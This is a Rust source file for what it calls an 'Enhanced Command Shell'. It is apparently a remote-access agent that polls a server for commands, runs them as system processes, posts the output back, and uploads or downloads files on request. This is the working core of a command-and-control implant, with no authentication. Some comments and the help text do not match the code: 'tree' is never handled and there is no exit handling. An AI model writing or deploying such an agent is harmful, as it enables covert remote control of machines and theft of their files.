use std::io::{self, Read};
use std::process::Command;
use std::env;
use std::fs;
use std::path::Path;

async fn execute_and_capture(cmd: &str, args: &[&str]) -> io::Result<String> {
    let output = Command::new(cmd)
        .args(args)
        .output()?;

    Ok(format!("Exit Code: {}\nStdout:\n{}\nStderr:\n{}", 
        output.status,
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)))
}

// Add tree-related functions for fun
fn display_tree(path: &Path, prefix: &str, is_last: bool) -> io::Result<()> {
    let display = path.file_name()
        .unwrap_or_else(|| path.as_os_str())
        .to_string_lossy();
    
    println!("{}{}{}", prefix, 
        if is_last { "└── " } else { "├── " }, 
        display);

    if path.is_dir() {
        let entries = fs::read_dir(path)?
            .collect::<Result<Vec<_>, io::Error>>()?;
        
        for (i, entry) in entries.iter().enumerate() {
            let new_prefix = format!("{}{}", 
                prefix,
                if is_last { "    " } else { "│   " }
            );
            display_tree(&entry.path(), &new_prefix, i == entries.len() - 1)?;
        }
    }
    Ok(())
}

async fn execute_command(parts: &[&str]) -> io::Result<String> {
    match parts[0] {
        "cd" => {
            let path = parts.get(1).map(|s| *s).unwrap_or(".");
            match env::set_current_dir(path) {
                Ok(_) => Ok(format!("Changed directory to: {}", 
                    env::current_dir()?.display())),
                Err(e) => Ok(format!("Error: {}", e))
            }
        },
        "pwd" => {
            Ok(format!("Current directory: {}", env::current_dir()?.display()))
        },
        "upload" => {
            let filename = parts.get(1)
                .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidInput, "Missing filename"))?;
            
            // Read file
            let content = fs::read(filename)?;
            
            // Upload file
            match ureq::post("http://127.0.0.1:8080/upload")
                .set("X-Filename", Path::new(filename).file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or(filename))
                .send_bytes(&content) {
                Ok(_) => Ok(format!("Successfully uploaded {}", filename)),
                Err(e) => Ok(format!("Failed to upload {}: {}", filename, e))
            }
        },
        "download" => {
            let filename = parts.get(1)
                .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidInput, "Missing filename"))?;
            
            // Download file
            match ureq::get(&format!("http://127.0.0.1:8080/download/{}", filename))
                .call() {
                Ok(response) => {
                    let bytes: Vec<u8> = response.into_reader()
                        .bytes()
                        .filter_map(|b| b.ok())
                        .collect();
                    
                    let size = bytes.len();
                    fs::write(filename, bytes)?;
                    Ok(format!("Successfully downloaded {} ({} bytes)", filename, size))
                },
                Err(e) => Ok(format!("Failed to download {}: {}", filename, e))
            }
        },
        "help" => {
            Ok(format!("Available commands:\n\
                cd (dir)        - Change directory\n\
                pwd             - Print working directory\n\
                tree            - Display directory tree\n\
                upload (file)   - Upload file to server\n\
                download (file) - Download file from server\n\
                help            - Show this help\n\
                (command)       - Execute system command"))
        },
        cmd => {
            let output = Command::new(cmd)
                .args(&parts[1..])
                .current_dir(env::current_dir()?)
                .output()?;

            Ok(format!("{}{}",
                String::from_utf8_lossy(&output.stdout),
                String::from_utf8_lossy(&output.stderr)))
        }
    }
}

fn stdin_ready() -> io::Result<bool> {
    let mut stdin = io::stdin();
    let mut buf = [0u8; 1];
    Ok(stdin.read(&mut buf)? > 0)
}

// This is a simple command shell that allows for basic file operations and command execution.
// It can change directories, upload and download files, and display a directory tree.
// PRECONDITION: The server must be running and accessible at the specified address.
// POSTCONDITION: The shell will exit when the user types 'exit'.
pub async fn run_shell(server_addr: &str) -> io::Result<()> {
    println!("Enhanced Command Shell started. Type 'help' for commands.");

    // Initialize starting directory
    let home_dir = dirs::home_dir()
        .ok_or_else(|| io::Error::new(io::ErrorKind::Other, "Could not determine home directory"))?;
    env::set_current_dir(&home_dir)?;

    loop {
        // Check for commands from server
        if let Ok(response) = ureq::get(&format!("http://{}/get_command", server_addr)).call() {
            if response.status() == 200 {
                let command = response.into_string()?;
                println!("Received command: {}", command);
                
                let parts: Vec<&str> = command.split_whitespace().collect();
                if !parts.is_empty() {
                    let output = match execute_command(&parts).await {
                        Ok(out) => out,
                        Err(e) => format!("Error: {}", e),
                    };

                    // Send result back to server
                    if let Err(e) = ureq::post(&format!("http://{}/submit_result", server_addr))
                        .set("X-Command", &command)
                        .send_string(&output) {
                        eprintln!("Failed to send result: {}", e);
                    }
                }
            }
        }

        // Small delay to prevent excessive polling
        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
    }
}
